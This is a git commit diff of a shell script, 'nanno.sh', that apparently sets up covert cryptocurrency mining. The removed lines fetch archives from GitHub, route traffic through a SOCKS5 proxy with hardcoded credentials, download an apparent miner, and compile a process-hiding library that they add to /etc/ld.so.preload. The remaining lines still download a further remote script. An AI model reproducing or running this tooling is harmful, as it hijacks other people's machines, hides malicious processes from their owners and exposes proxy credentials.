c4893404cfdb1b5d555d3b2058617a33be523eac
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-08 19:17:43 +0700

    Update nanno.sh

--- nanno.sh
+++ nanno.sh
@@ -4,46 +4,9 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233 
-loglevel = 1 
-socks5 = 3.15.39.186:1080 
-socks5_username = mikrotik999 
-socks5_password = Elibawnos 
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-
-echo " "
-
-echo "**"
-
-echo " "
-
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+#################################
+## Begin of user-editable part ##
+#################################
 
 wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/runNanno.sh
 
